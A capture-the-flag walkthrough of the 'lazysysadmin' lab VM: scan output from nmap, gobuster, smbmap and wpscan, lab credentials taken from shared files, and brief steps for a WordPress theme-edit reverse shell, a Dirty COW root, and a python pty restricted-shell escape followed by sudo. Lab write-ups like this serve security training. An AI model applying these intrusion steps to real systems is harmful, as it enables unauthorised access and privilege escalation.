[*] lazysysadmin [*]

# Date : 13/01/2022

# ->Enumeration Phase:

# Nmap 7.91 scan initiated Fri Jan 14 12:14:34 2022 as: nmap -sC -sV -p- -v -oN nmap_all 192.168.0.103
Nmap scan report for 192.168.0.103
Host is up (0.00035s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Silex v2.2.7
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 4 disallowed entries 
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.0.102
|_  error: Closing link: (nmap@192.168.0.102) [Client exited]
MAC Address: 08:00:27:22:02:42 (Oracle VirtualBox virtual NIC)
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3h19m12s, deviation: 5h46m24s, median: 46s
| nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   LAZYSYSADMIN<00>     Flags: <unique><active>
|   LAZYSYSADMIN<03>     Flags: <unique><active>
|   LAZYSYSADMIN<20>     Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2022-01-14T16:45:38+10:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-14T06:45:38
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 14 12:15:01 2022 -- 1 IP address (1 host up) scanned in 26.59 seconds

# gobuster found some directories:

/wordpress            (Status: 301) [Size: 317] [--> http://192.168.0.103/wordpress/]
/test                 (Status: 301) [Size: 312] [--> http://192.168.0.103/test/]     
/wp                   (Status: 301) [Size: 310] [--> http://192.168.0.103/wp/]       
/apache               (Status: 301) [Size: 314] [--> http://192.168.0.103/apache/]   
/old                  (Status: 301) [Size: 311] [--> http://192.168.0.103/old/]      
/javascript           (Status: 301) [Size: 318] [--> http://192.168.0.103/javascript/]
/phpmyadmin           (Status: 301) [Size: 318] [--> http://192.168.0.103/phpmyadmin/]
/server-status        (Status: 403) [Size: 293] 

>> and also by manually searching robots.txt file is also present.

User-agent: *
Disallow: /old/
Disallow: /test/
Disallow: /TR2/
Disallow: /Backnode_files/

# smb is open so i check all smb  readable shares and fetch files recursivily.

smbmap  -H 192.168.0.103 -r 
[+] Guest session       IP: 192.168.0.103:445   Name: 192.168.0.103                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        share$                                                  READ ONLY       Sumshare
        .\share$\*
        dr--r--r--                0 Tue Aug 15 16:35:52 2017    .
        dr--r--r--                0 Mon Aug 14 18:04:47 2017    ..
        dr--r--r--                0 Tue Aug 15 16:51:08 2017    wordpress
        dr--r--r--                0 Mon Aug 14 17:38:26 2017    Backnode_files
        dr--r--r--                0 Tue Aug 15 16:21:23 2017    wp
        fr--r--r--              139 Mon Aug 14 17:50:05 2017    deets.txt
        fr--r--r--               92 Mon Aug 14 18:06:14 2017    robots.txt
        fr--r--r--               79 Mon Aug 14 18:09:56 2017    todolist.txt
        dr--r--r--                0 Mon Aug 14 18:05:19 2017    apache
        fr--r--r--            36072 Sun Aug  6 10:32:14 2017    index.html
        fr--r--r--               20 Tue Aug 15 16:25:19 2017    info.php
        dr--r--r--                0 Mon Aug 14 18:05:10 2017    test
        dr--r--r--                0 Mon Aug 14 18:05:13 2017    old
        IPC$                                                    NO ACCESS       IPC Service (Web server)

>> after viiting the deet.txt file on web found following message:

CBF Remembering all these passwords.
Remember to remove this file and update your password after we push out the server.
Password 12345

>> after visiting the todolist file on port 80 found :

Prevent users from being able to view to web root using the local file browser

>> when visiting wordpress site i know username is : My name is togie.

# ->Exploitation Phase:

# scanning the wordpress using wpscan tool make following results:

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[32m[+][0m URL: http://192.168.0.103/wordpress/ [192.168.0.103]
[32m[+][0m Started: Fri Jan 14 13:07:08 2022

Interesting Finding(s):

[32m[+][0m Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[32m[+][0m XML-RPC seems to be enabled: http://192.168.0.103/wordpress/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[32m[+][0m WordPress readme found: http://192.168.0.103/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Registration is enabled: http://192.168.0.103/wordpress/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Upload directory has listing enabled: http://192.168.0.103/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m The external WP-Cron seems to be enabled: http://192.168.0.103/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[32m[+][0m WordPress version 4.8.1 identified (Insecure, released on 2017-08-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.0.103/wordpress/?feed=rss2, <generator>https://wordpress.org/?v=4.8.1</generator>
 |  - http://192.168.0.103/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.8.1</generator>

[32m[+][0m WordPress theme in use: twentyfifteen
 | Location: http://192.168.0.103/wordpress/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://192.168.0.103/wordpress/wp-content/themes/twentyfifteen/readme.txt
 | [33m[!][0m The version is out of date, the latest version is 3.0
 | Style URL: http://192.168.0.103/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.0.103/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1, Match: 'Version: 1.8'

[32m[+][0m Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs -: |===============================================================================================|

[34m[i][0m User(s) Identified:

[32m[+][0m View all posts by Admin
 | Found By: Author Posts - Display Name (Passive Detection)

[32m[+][0m Admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
[33m[!][0m You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[32m[+][0m Finished: Fri Jan 14 13:07:13 2022
[32m[+][0m Requests Done: 15
[32m[+][0m Cached Requests: 47
[32m[+][0m Data Sent: 4.344 KB
[32m[+][0m Data Received: 15.849 KB
[32m[+][0m Memory used: 185.969 MB
[32m[+][0m Elapsed time: 00:00:05

# I focus on port 6667 is internet relay chat(irc):
>> Connect this port using telnet and login using a random user.

telnet <victim_ip> 6667
USER <user_name> 0 * <user_name>
NICK <user_name>

>> login successfull.
>> i run command ADMIN ,found admin info

:Admin.local 257 ran213eqdw123 :Name     - Root Penguin
:Admin.local 258 ran213eqdw123 :Nickname - Nick
:Admin.local 259 ran213eqdw123 :E-Mail   - root@localhost

>> 

>> again login into smb server having share$ read access. then go into wordpress folder and i found
>> wp-config.php file in which username and password of mysql server are present

define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

# ->PostExploitation Phase:

>> the login in wordpress using upper password and username admin.
>> then change the content in 404.php file and got to : http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php.
>> got a reverse shell.

>> after inumeration find that the linux version is vulnerbal to diretycow vulnerbility. it is kernal exploit.
>> so download for github do all instructions and got a root.

>> or simple do ssh togie@<IP> and password is given in deet.txt file as hint.
>> and got a togie shell having restricted shell.so type python3 -c'import pty;pty.spawn("/bin/bash")' and escape form restricted shell.
>> run sudo -l

all (all) : all
>> run sudo su : and goot root access.

# proof.txt : 

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu


